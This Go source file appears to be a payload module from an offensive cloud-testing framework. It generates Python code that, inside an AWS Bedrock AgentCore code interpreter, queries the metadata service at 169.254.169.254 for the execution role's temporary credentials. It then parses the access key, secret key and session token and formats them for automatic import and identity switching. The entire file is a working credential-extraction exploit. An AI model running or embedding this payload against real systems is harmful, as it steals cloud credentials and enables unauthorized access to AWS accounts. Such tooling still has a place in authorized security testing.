package bedrock

import (
	"encoding/json"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"
	"time"
)

// ExfilMMDSPayload extracts temporary credentials from the MicroVM Metadata Service (MMDS)
// at 169.254.169.254 inside a Bedrock AgentCore code interpreter. The MMDS is functionally
// equivalent to EC2's IMDS — it exposes the execution role's temporary credentials at the
// well-known IAM security-credentials endpoint.
//
// This payload generates self-contained Python code that:
//  1. Requests an IMDSv2 session token via PUT /latest/api/token
//  2. Reads the role name from /latest/meta-data/iam/security-credentials/
//  3. Fetches and prints the credentials JSON for that role
//
// The code uses only Python's standard-library urllib.request — no pip dependencies.
type ExfilMMDSPayload struct{}

func init() {
	payloads.Register(&ExfilMMDSPayload{})
}

func (p *ExfilMMDSPayload) GetName() string {
	return "exfil/response"
}

func (p *ExfilMMDSPayload) GetDescription() string {
	return "Extract execution-role credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254"
}

func (p *ExfilMMDSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBedrock,
		payloads.TagLanguagePython,
		payloads.TagTechniqueExfil,
		payloads.TagTransportResponse,
	}
}

func (p *ExfilMMDSPayload) GetOptions() []modules.Option {
	// No options required — credential endpoint and role name are auto-detected from MMDS.
	return []modules.Option{}
}

func (p *ExfilMMDSPayload) Validate(options map[string]string) error {
	return nil
}

// GenerateCode returns raw Python code (no Lambda handler wrapper) that queries the
// MicroVM Metadata Service via IMDSv2 and prints the credentials as a JSON object to stdout.
//
// The Bedrock code interpreter executes this code directly in the microVM Python environment,
// and stdout is captured in the InvokeCodeInterpreter response stream.
func (p *ExfilMMDSPayload) GenerateCode(options map[string]string) (string, error) {
	code := `import urllib.request
import json

# MicroVM Metadata Service — functionally equivalent to EC2 IMDS.
# The execution role's temporary credentials are accessible at the standard
# IAM security-credentials endpoint using the IMDSv2 protocol.
MMDS_BASE = "http://169.254.169.254/latest"

# Step 1: Obtain an IMDSv2 session token (required — IMDSv1 is not available).
token_request = urllib.request.Request(
    MMDS_BASE + "/api/token",
    method="PUT",
    headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
)
with urllib.request.urlopen(token_request, timeout=10) as response:
    imds_token = response.read().decode().strip()

imds_headers = {"X-aws-ec2-metadata-token": imds_token}

# Step 2: Discover the role name bound to this execution environment.
role_request = urllib.request.Request(
    MMDS_BASE + "/meta-data/iam/security-credentials/",
    headers=imds_headers,
)
with urllib.request.urlopen(role_request, timeout=10) as response:
    role_name = response.read().decode().strip()

# Step 3: Retrieve the temporary credentials for that role.
creds_request = urllib.request.Request(
    MMDS_BASE + "/meta-data/iam/security-credentials/" + role_name,
    headers=imds_headers,
)
with urllib.request.urlopen(creds_request, timeout=10) as response:
    credentials_json = response.read().decode()

# Print the raw JSON — the module parses it from stdout.
print(credentials_json)
`
	return code, nil
}

// mmdsCredentials mirrors the JSON structure returned by the MMDS credentials endpoint.
type mmdsCredentials struct {
	AccessKeyID     string `json:"AccessKeyId"`
	SecretAccessKey string `json:"SecretAccessKey"`
	Token           string `json:"Token"`
	Expiration      string `json:"Expiration"`
	Type            string `json:"Type"`
	LastUpdated     string `json:"LastUpdated"`
}

// ProcessResult parses the MMDS credentials JSON from the code interpreter stdout and
// formats a human-readable result with PATHFINDER_IDENTITY_DATA markers for auto-import.
func (p *ExfilMMDSPayload) ProcessResult(result string) (string, error) {
	// The result may contain extra text before/after the JSON — scan for it.
	credJSON := extractCredentialJSON(result)
	if credJSON == "" {
		return result, fmt.Errorf("no credential JSON found in interpreter output: %s", result)
	}

	var creds mmdsCredentials
	if err := json.Unmarshal([]byte(credJSON), &creds); err != nil {
		return result, fmt.Errorf("failed to parse MMDS credentials JSON: %v (raw: %s)", err, credJSON)
	}

	if creds.AccessKeyID == "" || creds.SecretAccessKey == "" || creds.Token == "" {
		return result, fmt.Errorf("incomplete credentials in MMDS response: %s", credJSON)
	}

	identityName := fmt.Sprintf("bedrock_codeinterpreter_%d", time.Now().Unix())

	var output strings.Builder
	output.WriteString("=== Bedrock Code Interpreter Credential Extraction ===\n\n")
	output.WriteString("Successfully retrieved execution-role credentials from MMDS!\n\n")
	output.WriteString(fmt.Sprintf("Access Key ID : %s...\n", safeTruncate(creds.AccessKeyID, 10)))
	if creds.Expiration != "" {
		output.WriteString(fmt.Sprintf("Expiration    : %s\n", creds.Expiration))
	}
	output.WriteString("\n")

	// PATHFINDER_IDENTITY_DATA block for automatic credential import.
	output.WriteString("--- PATHFINDER_IDENTITY_DATA ---\n")
	output.WriteString(fmt.Sprintf("NAME=%s\n", identityName))
	output.WriteString("TYPE=assumed_role\n")
	output.WriteString(fmt.Sprintf("ACCESS_KEY_ID=%s\n", creds.AccessKeyID))
	output.WriteString(fmt.Sprintf("SECRET_ACCESS_KEY=%s\n", creds.SecretAccessKey))
	output.WriteString(fmt.Sprintf("SESSION_TOKEN=%s\n", creds.Token))
	if creds.Expiration != "" {
		output.WriteString(fmt.Sprintf("EXPIRES_AT=%s\n", creds.Expiration))
	}
	output.WriteString("AUTO_SWITCH=true\n")
	output.WriteString("--- END_PATHFINDER_IDENTITY_DATA ---\n")

	return output.String(), nil
}

// extractCredentialJSON scans a string for the MMDS credential JSON object.
// The stdout may contain extra lines; the JSON will contain "AccessKeyId".
func extractCredentialJSON(output string) string {
	output = strings.TrimSpace(output)

	// Check each line from the end — the credentials are usually the last JSON object.
	lines := strings.Split(output, "\n")
	for i := len(lines) - 1; i >= 0; i-- {
		line := strings.TrimSpace(lines[i])
		if strings.HasPrefix(line, "{") && strings.Contains(line, "AccessKeyId") {
			return line
		}
	}

	// Fallback: find the first JSON object containing AccessKeyId anywhere in the output.
	startIdx := strings.Index(output, `"AccessKeyId"`)
	if startIdx == -1 {
		return ""
	}
	// Scan backwards for the opening brace.
	for i := startIdx - 1; i >= 0; i-- {
		if output[i] == '{' {
			startIdx = i
			break
		}
	}

	depth := 0
	for i := startIdx; i < len(output); i++ {
		switch output[i] {
		case '{':
			depth++
		case '}':
			depth--
			if depth == 0 {
				return output[startIdx : i+1]
			}
		}
	}

	return ""
}

// safeTruncate returns the first n characters of s, or all of s if shorter.
func safeTruncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
